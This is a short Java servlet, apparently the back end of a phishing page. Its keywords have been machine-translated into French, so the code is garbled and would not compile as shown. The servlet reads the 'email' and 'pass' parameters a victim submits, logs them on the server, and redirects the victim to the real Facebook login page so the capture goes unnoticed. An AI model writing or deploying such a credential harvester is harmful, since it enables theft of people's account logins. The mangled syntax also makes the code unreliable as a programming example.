forfait  com.service ;

import  java.io.IOException ;
import  javax.servlet.ServletException ;
importer  javax.servlet.annotation.WebServlet ;
importer  javax.servlet.http.HttpServlet ;
import  javax.servlet.http.HttpServletRequest ;
importer  javax.servlet.http.HttpServletResponse ;

/**
 * Classe d'implémentation de servlet Getpass
 */
@WebServlet ( " /Getpass " )
la  classe  publique Getpass  étend  HttpServlet {
	privé  statique  final  long serialVersionUID =  1L ;
       
    /**
     * @voir HttpServlet#HttpServlet()
     */
    public  Getpass () {
        super ();
        // Stub de constructeur TODO généré automatiquement
    }

	/**
	 * @see HttpServlet#doPost (demande HttpServletRequest, réponse HttpServletResponse)
	 */
	protégé  vide  doGet ( HttpServletRequest  demande , HttpServletResponse  réponse ) jette  ServletException , IOException {
		// Stub de méthode TODO généré automatiquement
		Système . dehors . println(request . getParameter( " email " ));
		Système . dehors . println(request . getParameter( " pass " ));
		
		réponse . sendRedirect( " https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110 " );
	}

}
